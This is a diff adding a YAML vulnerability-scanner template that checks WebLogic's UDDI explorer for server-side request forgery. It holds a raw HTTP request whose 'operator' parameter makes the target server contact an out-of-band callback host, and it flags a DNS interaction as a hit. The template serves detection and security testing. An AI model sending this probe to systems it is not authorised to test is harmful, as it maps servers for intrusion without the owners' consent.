@@ -1,0 +1,29 @@
+id: poc-yaml-weblogic-ssrf
+info:
+  name: Weblogic Server-Side Request Forgery
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: ssrf,weblogic
+  description: |
+    This template detects a Server-Side Request Forgery (SSRF) vulnerability in Weblogic's UDDI explorer.
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{{reverse}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        Accept: */*
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+      - type: status
+        status:
+          - 200
